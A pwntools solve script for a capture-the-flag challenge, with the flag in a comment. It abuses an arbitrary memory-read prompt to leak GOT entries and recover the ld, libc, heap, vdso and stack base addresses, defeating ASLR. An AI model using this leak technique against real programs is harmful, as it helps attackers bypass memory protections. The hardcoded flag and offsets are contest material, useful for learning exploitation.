#!/usr/bin/env python3

#bctf{4te_3verY_B1t_0f_THe_PIE}

from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13375
#HOST = "127.0.0.1"
#PORT = 1024


gdbscript = '''
c
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)


locs = {'[vsyscall]': 0xffffffffff600000, '/app/run': 0x400000, }


def read_addr(addr: int):
    r.sendlineafter(b'captain?', str(addr).encode())
    r.recvuntil(b'We gathered ')
    return int(r.recvline().split()[0])


puts_got = 0x404008
puts_addr = read_addr(0x404008)

ld_base = puts_addr - 242400 # idk why
ld.address = ld_base
locs['/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'] = ld_base

strlen_addr = read_addr(0x404010)
libc_base = strlen_addr - 2374960 # idk why
libc.address = libc_base
locs['/usr/lib/x86_64-linux-gnu/libc.so.6'] = libc_base


heap_addr = read_addr(libc_base + (0x78aa1241a3c0 - 0x78aa12200000))
locs['[heap]'] = heap_addr

vdso_base = read_addr(ld_base + 0x39dc8)
locs['[vdso]'] = vdso_base

vvar_base = vdso_base - 0x4000
locs['[vvar]'] = vvar_base

stack_leak = read_addr(libc.symbols['program_invocation_name'])
print(hex(stack_leak))
stack_base = stack_leak - 135142
locs['[stack]'] = stack_base

for k,v in locs.items():
    print(k, hex(v))

r.sendline(b'0')

for _ in range(len(locs)):
    r.recvuntil(b'Where in the world is')
    bin_name = r.recvline().strip()[:-1].decode()
    r.sendline(str(locs[bin_name]).encode())

r.recvuntil(b'You have been blessed with flaghood.')
print(r.recvall().strip().decode())
